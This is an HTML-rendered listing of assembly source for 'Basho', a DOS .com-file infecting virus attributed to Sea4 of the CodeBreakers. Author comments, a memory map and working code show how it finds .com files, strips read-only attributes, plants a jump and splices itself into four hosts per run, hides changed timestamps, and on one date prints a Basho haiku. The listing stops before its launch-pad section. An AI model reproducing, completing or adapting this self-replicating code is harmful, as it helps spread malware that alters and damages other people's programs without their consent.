<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>basho.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; NAME: Basho.com</span><span class="sc0">
</span><span class="sc1">; SIZE: 431 bytes</span><span class="sc0">
</span><span class="sc1">; AUTHOR: Sea4</span><span class="sc0">
</span><span class="sc1">; TYPE: Appending in a weird way.</span><span class="sc0">
</span><span class="sc1">; ENCRYPTION: No</span><span class="sc0">
</span><span class="sc1">; DT: Yes</span><span class="sc0">
</span><span class="sc1">; STEALTH: No</span><span class="sc0">
</span><span class="sc1">; REPAIRABLE: Yes</span><span class="sc0">
</span><span class="sc1">; PAYLOAD: Yes   </span><span class="sc0">
</span><span class="sc1">; RESIDENT: No</span><span class="sc0">
</span><span class="sc1">; ROI: 4 files per run</span><span class="sc0">
</span><span class="sc1">; POLYMORPHIC: No</span><span class="sc0">

</span><span class="sc1">; Explanation.</span><span class="sc0">
</span><span class="sc1">; Its not very easy to understand at first glance how it even possibly works.</span><span class="sc0">
</span><span class="sc1">; But the plain and simple fact is that it DOES work, and it works well. I</span><span class="sc0">
</span><span class="sc1">; thought of the concept right before I went to sleep the other night, maybe</span><span class="sc0">
</span><span class="sc1">; I was having hallucinations or something. I am not even sure if its an</span><span class="sc0">
</span><span class="sc1">; original idea. But I like it!</span><span class="sc0">

</span><span class="sc1">; WTF it does:</span><span class="sc0">
</span><span class="sc1">; Upon execution the JMP at the beginning of the infected file will jump to</span><span class="sc0">
</span><span class="sc1">; what I call the virus' launching pad. Its does a few menial tasks like</span><span class="sc0">
</span><span class="sc1">; saving/restoring program code and the DTA. It also launches the true virus.</span><span class="sc0">
</span><span class="sc1">; The true virus is stored where actual program code used to be, I call that</span><span class="sc0">
</span><span class="sc1">; area of program code P3.</span><span class="sc0">
</span><span class="sc1">; P1 = Is the area the infecting JMP is stored.</span><span class="sc0">
</span><span class="sc1">; P2 = Is the middle of infected program.</span><span class="sc0">
</span><span class="sc1">; P3 = The last bytes of program that have been moved to</span><span class="sc0">
</span><span class="sc1">;         make room for Basho.</span><span class="sc0">
</span><span class="sc1">; V1 = Main Body of BASHO</span><span class="sc0">
</span><span class="sc1">; V2 = Launching Pad</span><span class="sc0">
</span><span class="sc1">; Upon execution of the true virus code, files will be infected, and the bomb</span><span class="sc0">
</span><span class="sc1">; will be tested, etc. etc. Afterward the True Virus Code will RET back to</span><span class="sc0">
</span><span class="sc1">; the launchpad, and the P3 area will be restored as well as the DTA, and</span><span class="sc0">
</span><span class="sc1">; the host file will be run 100% without error. ( or at least I think so ).</span><span class="sc0">

</span><span class="sc1">; Why the hell I did it:</span><span class="sc0">
</span><span class="sc1">; Just to confuse everyone, including the AV companies and myself.</span><span class="sc0">

</span><span class="sc1">; -- Sea4 of the CodeBreakers</span><span class="sc0">

</span><span class="sc1">;***************************************************************  </span><span class="sc0">
</span><span class="sc1">; A little Map      </span><span class="sc0">
</span><span class="sc1">;==============               ==============          </span><span class="sc0">
</span><span class="sc1">;|            |               |____________| &lt;-- Jmp To Launching </span><span class="sc0">
</span><span class="sc1">;|            |               |            |     Pad ( P1 )</span><span class="sc0">
</span><span class="sc1">;|            |               | Program    |</span><span class="sc0">
</span><span class="sc1">;| UnInfected |               | bytes that |</span><span class="sc0">
</span><span class="sc1">;|  Host      |               | are not    |</span><span class="sc0">
</span><span class="sc1">;|            |               | affected.  |</span><span class="sc0">
</span><span class="sc1">;|            |               |  ( P2 )    |</span><span class="sc0">
</span><span class="sc1">;|            |               |            |</span><span class="sc0">
</span><span class="sc1">;|            |               |            |</span><span class="sc0">
</span><span class="sc1">;|            |               |            |</span><span class="sc0">
</span><span class="sc1">;|            |               |____________|</span><span class="sc0">
</span><span class="sc1">;|            |               |            |</span><span class="sc0">
</span><span class="sc1">;|            | File Length   | Main body  |</span><span class="sc0">
</span><span class="sc1">;|            | Before Infect.| of BASHO.  |</span><span class="sc0">
</span><span class="sc1">;|            |       |       |   ( V1 )   |</span><span class="sc0">
</span><span class="sc1">;|            |       |       |          * | &lt;-- Ret to Launch Pad</span><span class="sc0">
</span><span class="sc1">;==============  &lt;&lt;- - - -&gt;&gt;  ==============</span><span class="sc0">
</span><span class="sc1">;                             | Bytes moved|</span><span class="sc0">
</span><span class="sc1">;    Additional Area          |to make room|</span><span class="sc0">
</span><span class="sc1">; Now that file has been      |for BASHO.  |</span><span class="sc0">
</span><span class="sc1">; infected with BASHO         |   ( P3 )   |</span><span class="sc0">
</span><span class="sc1">;                             |____________|</span><span class="sc0">
</span><span class="sc1">;                             |Launch Pad  |</span><span class="sc0">
</span><span class="sc1">; P3 and the main body        |   ( V2 )   |</span><span class="sc0">
</span><span class="sc1">; of BASHO have the same      ============== &lt;-- New file length</span><span class="sc0">
</span><span class="sc1">; length.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;***************************************************************</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">StartV2</span><span class="sc0">

</span><span class="sc5">startV1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">; Actual Virus code</span><span class="sc0">
</span><span class="sc5">V1Length</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">endV1</span><span class="sc4">-</span><span class="sc5">startV1</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">victims</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">     </span><span class="sc1">; Starts at 0 for victem count</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">              </span><span class="sc1">; Function 47h: Get Current Directory</span><span class="sc0">
</span><span class="sc6">cwd</span><span class="sc0">                      </span><span class="sc1">; 00h in DL = Default Drive</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Cur_DIR</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; 64 byte buffer for pathname</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; Calls DOS to write current DIR to CurDIR</span><span class="sc0">

</span><span class="sc5">Dot_Dot</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">infectDIR</span><span class="sc0">
</span><span class="sc5">Next_Dir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">              </span><span class="sc1">; Function 3Bh: Change Directory</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Dot_mask</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Saved starting directory</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; Calls DOS or Dir Change</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0">  </span><span class="sc5">Dot_Dot</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">Badstuff</span><span class="sc0">            </span><span class="sc1">; All directories have been killed, lets go</span><span class="sc0">

</span><span class="sc5">InfectDIR</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; Here is our find file thingy</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">         </span><span class="sc1">; Find files</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">; Looking for all file types</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">com_mask</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Points to the *.com</span><span class="sc0">
</span><span class="sc5">FindNext</span><span class="sc4">:</span><span class="sc0">                
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">            </span><span class="sc1">; Find all the com files</span><span class="sc0">

</span><span class="sc6">jnc</span><span class="sc0">  </span><span class="sc5">Open</span><span class="sc0">           </span><span class="sc1">; Success</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">Next_DIR</span><span class="sc0">       </span><span class="sc1">; None left in this directory, lets move</span><span class="sc0">

</span><span class="sc5">Move_FP</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; Move file Pointer call</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
</span><span class="sc5">Here</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Open</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; Set attrib to 0, so we can write over read only files and such</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">            </span><span class="sc1">; Set attrib to 0</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">File_name</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Here</span><span class="sc0">

</span><span class="sc1">; Opens file for read/write access</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">            </span><span class="sc1">; Open File</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Gives the file handle from AX to BX in one byte.</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">              </span><span class="sc1">; Read first three bytes</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                </span><span class="sc1">; 3 bytes, CX holds number of bytes to read</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">saved</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Buffer for saved bytes :)</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; Tells DOS to read 'em</span><span class="sc0">

</span><span class="sc1">; Check infection criteria</span><span class="sc0">
</span><span class="sc1">; If file is too large it may crash, and too small is easily noticable</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">; See if file is larger than 1 segment</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">File_size_off</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; 9Ch holds the segment size, Basho doesn't handle</span><span class="sc0">
                         </span><span class="sc1">; files larger than one segment, so we can't</span><span class="sc0">
                         </span><span class="sc1">; infect something larger than FFFFh bytes</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">               </span><span class="sc1">; Its more than 1 segment lets escape</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">File_size</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Retrieves offset size of target file</span><span class="sc0">

</span><span class="sc1">; File must be greater than 1k</span><span class="sc0">
</span><span class="sc1">; Keeping smaller files from being infected</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">   </span><span class="sc1">; 400h = 1024 bytes ( 1k )</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">Close</span><span class="sc0">     </span><span class="sc1">; Its too small, get the hell outta here</span><span class="sc0">

</span><span class="sc1">; File must be less than 61440</span><span class="sc0">
</span><span class="sc1">; Stack errors and wrapping of bytes may occur if the</span><span class="sc0">
</span><span class="sc1">; file + virus + buffer excedes 1 segment ( FFFFh bytes )</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F000h</span><span class="sc0"> </span><span class="sc1">; 61440, to provide room for buffer and virus size</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">     </span><span class="sc1">; To big, may cause errors, can't do it</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; Saves file size for later </span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                     </span><span class="sc1">; Taking into account the JMP</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; Save that for the new 3 bytes</span><span class="sc0">

</span><span class="sc1">; Test 2nd + 3rd bytes for JMP location to V2 ( LaunchPad )</span><span class="sc0">
</span><span class="sc1">; Here we check for previous infection by testing if the jump looks</span><span class="sc0">
</span><span class="sc1">; like one created by a previous running of Basho.</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">V2Length</span><span class="sc0">    </span><span class="sc1">; We need the new jump to go to the launch pad</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">saved</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Tests if the file has been infected with Basho</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0">   </span><span class="sc5">Close</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; Retrieves jump location</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">V1Length</span><span class="sc0">              </span><span class="sc1">; Adds the length added by virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">jumpto</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Sets jump location for victim</span><span class="sc0">

</span><span class="sc1">; Set FP to beginning</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Move_FP</span><span class="sc0">

</span><span class="sc1">; Write new JMP to victim</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                     </span><span class="sc1">; Length of area to write ( 3 bytes )</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">jumping</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; its the location of the new JMP</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Move FP to get bytes from End of victim</span><span class="sc0">
</span><span class="sc1">; Since DX specifies the location in bytes from beginning we want</span><span class="sc0">
</span><span class="sc1">; to move the FP, and since we want to move to End of File-V1Length</span><span class="sc0">
</span><span class="sc1">; We take the entire filesize-V1Length, and move that far from</span><span class="sc0">
</span><span class="sc1">; the beginning of file.</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">; Retrieves filesize</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">V1Length</span><span class="sc0">              </span><span class="sc1">; Places location in file at End-V1Length</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">; Saves this spot for the write</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Move_FP</span><span class="sc0">

</span><span class="sc1">; Here is where we retrieve the P3 file bytes and save them for later</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                   </span><span class="sc1">; Function 3Fh: Read from file/device</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">V1Length</span><span class="sc0">              </span><span class="sc1">; Number of bytes to read</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">startP3</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Actual area for file bytes</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">; Duh, it read those bytes into the P3 area</span><span class="sc0">

</span><span class="sc1">; Now we write the virus code into that area we just made</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">; Retrieves location by previous Move FP</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Move_FP</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">endV2</span><span class="sc4">-</span><span class="sc5">startV1</span><span class="sc0">         </span><span class="sc1">; Now we can just write all that area to</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">startV1</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; The victem because we have prepared so well :)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">victims</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Increments our Byte counter</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">            </span><span class="sc1">; Set Date/Time stamps</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">File_Date</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">File_Time</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Close File   </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                   </span><span class="sc1">; Function 3Eh: Close file</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">; Shut that mo fo down</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">              </span><span class="sc1">; Reset attributes</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">File_Name</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Attributes</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                   </span><span class="sc1">; Only four files per run</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">victims</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">          </span><span class="sc1">; Sees if we have had that many so far</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0">  </span><span class="sc5">BadStuff</span><span class="sc0">                 </span><span class="sc1">; If so, run the bomb sequence</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4F00h</span><span class="sc0">                 </span><span class="sc1">; Jump to FindNext routines</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">FindNext</span><span class="sc0">


</span><span class="sc5">BadStuff</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Payload</span><span class="sc0">
</span><span class="sc1">; Before starting the bomb, we head to original DIR</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">         </span><span class="sc1">; Function 3Bh: Change Directory</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Cur_DIR</span><span class="sc4">]</span><span class="sc1">; Saved starting directory</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Activation checker</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">         </span><span class="sc1">; Function 04h: Get Real Time Clock ( Date )</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">1Ah</span><span class="sc0">            </span><span class="sc1">; INT 1Ah BIOS Time interrupt</span><span class="sc0">
                    </span><span class="sc1">; Gets the date and puts the value into the following</span><span class="sc0">
                    </span><span class="sc1">; registers.</span><span class="sc0">
          </span><span class="sc1">; CH = Century</span><span class="sc0">
          </span><span class="sc1">; CL = Year</span><span class="sc0">
          </span><span class="sc1">; DH = Month</span><span class="sc0">
          </span><span class="sc1">; DL = Day</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0701h</span><span class="sc0">       </span><span class="sc1">; July 7th, I like this day.</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0">  </span><span class="sc5">Exit</span><span class="sc0">           </span><span class="sc1">; Its not the date, we'll try another time</span><span class="sc0">

</span><span class="sc1">; Just displays a simple message</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                   </span><span class="sc1">; Function 09h: Write string to std output</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">message</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Where the message is stored</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">; Announce our presence</span><span class="sc0">

</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0FFFCh</span><span class="sc0"> </span><span class="sc1">; Restores the stack pointer to where the RET should go to</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">            </span><span class="sc1">; I did this to make sure it would go back to the right spot</span><span class="sc0">
               </span><span class="sc1">; Then return to caller.</span><span class="sc0">

</span><span class="sc5">virus_name</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'[Basho]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">; Named after the poet</span><span class="sc0">
</span><span class="sc5">author</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'Sea4, CodeBreakers'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Me and who I work for</span><span class="sc0">
</span><span class="sc5">com_mask</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'*.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; Com file mask</span><span class="sc0">
</span><span class="sc5">dot_mask</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; Dot dot dir mask</span><span class="sc0">
</span><span class="sc5">saved</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">   </span><span class="sc1">; Saved 3 bytes from infected files</span><span class="sc0">
</span><span class="sc5">jumping</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0E9h</span><span class="sc0">           </span><span class="sc1">; JMP</span><span class="sc0">
</span><span class="sc5">jumpto</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Jump to launch pad</span><span class="sc0">
</span><span class="sc5">message</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'The temple bell stops,'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">   </span><span class="sc1">; A lovely Haiku</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'But the sound keeps coming'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'Out of the flowers.'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc5">endV1</span><span class="sc4">:</span><span class="sc0">


